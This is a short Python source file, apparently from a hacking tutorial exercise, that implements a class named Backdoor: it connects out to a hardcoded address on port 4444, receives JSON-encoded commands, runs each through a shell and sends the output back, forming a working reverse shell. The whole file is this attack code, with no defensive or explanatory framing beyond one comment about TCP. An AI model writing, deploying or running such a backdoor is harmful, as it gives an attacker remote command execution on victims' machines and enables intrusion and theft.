import socket
import subprocess, json


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # SOCK_STREAM means we want to create
        # a TCP connection and TCP is a stream based protocol
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_recv(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            command = self.reliable_recv()
            command_result = self.execute_system_command(command)
            self.reliable_send(command_result)

        connection.close()


myBackdoor = Backdoor("10.0.2.15", 4444)
myBackdoor.run()
